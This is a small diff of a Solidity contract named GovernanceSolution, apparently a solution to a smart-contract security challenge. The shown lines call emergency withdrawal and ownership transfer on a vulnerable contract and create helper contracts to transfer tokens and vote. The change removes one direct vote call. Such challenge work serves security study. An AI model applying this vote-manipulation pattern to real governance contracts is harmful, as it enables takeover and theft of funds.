@@ -44,7 +44,7 @@ contract GovernanceSolution {
         vuln.emergencyWithdraw(0);
         vuln.withdraw(0, 1611392);
         vuln.transferOwnership(address(this));
-        Gov.vote(EOA);
+
         transferandvote firsttransferandvote = new transferandvote();
         vuln.transfer(
             address(firsttransferandvote),
